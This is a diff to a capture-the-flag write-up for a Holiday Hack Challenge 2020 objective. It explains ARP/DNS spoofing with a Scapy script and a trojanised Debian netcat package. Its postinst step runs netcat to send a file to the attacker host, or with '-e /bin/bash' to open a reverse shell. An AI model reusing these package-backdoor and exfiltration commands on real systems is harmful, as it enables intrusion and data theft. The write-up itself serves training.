@@ -11,7 +11,7 @@ Exercise setup:
 
 A [Python Scapy script](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/spoof.py) was prepared to spoof ARP replies for the spoofed host redirecting the traffic to the local host.
 Furthermore this script spoofs DNS queries destined to the spoofed host and does always return A records pointing to it's own local IP address.
-The scripts takes the IP address of the spoofed host as argument, to here is has to be called with `./spoof.py
+The scripts takes the IP address of the spoofed host as argument, to here is has to be called with `./spoof.py 10.6.6.53`.
 
 Capture of ARP and DNS spoofing with following HTTP request:
 ```
@@ -22,18 +22,20 @@ Capture of ARP and DNS spoofing with following HTTP request:
 17:27:18.098422 IP 10.6.6.35.50340 > 10.6.0.2.80: Flags [S], seq 2451495177, win 64240, options [mss 1460,sackOK,TS val 2516141758 ecr 0,nop,wscale 7], length 0
 17:27:18.098452 IP 10.6.0.2.80 > 10.6.6.35.50340: Flags [R.], seq 0, ack 2451495178, win 0, length 0
 ```
+
 A Node.js HTTP server was started using  `python3 -m http.server 80` and it logged the request:
 
     10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
 
 On the device the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
-This package was modified to include this line in the postinst script:
+This package was modified to include a netcat command in the postinst script to send the text file to our local host:
 `/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
 
 By opting for 
 `/bin/nc 10.6.0.2 4444 -e /bin/bash`
 an interactive reverse shell can be acquired.
 ```
+
 guest@faf32a4d4929:~/debs$ mkdir tmp
 guest@faf32a4d4929:~/debs$ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
 guest@faf32a4d4929:~/debs$ vi tmp/DEBIAN/postinst 
@@ -48,9 +50,9 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTMxMTMwMzQ2OCwxMjcyNjU2NDE5LDg1OD
-E4ODkyOSwxMDkyNzg1MzIxLC0yMDYyNjc1Mjk3LC02MTI4OTc3
-OTksLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2MzQzOTQ5NDEsMT
-IwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4MzkyMjE2LDUxNDIw
-OTE1OV19
+eyJoaXN0b3J5IjpbODg1OTE4OTgxLDEyNzI2NTY0MTksODU4MT
+g4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5
+OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMj
+A0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5
+MTU5XX0=
 -->
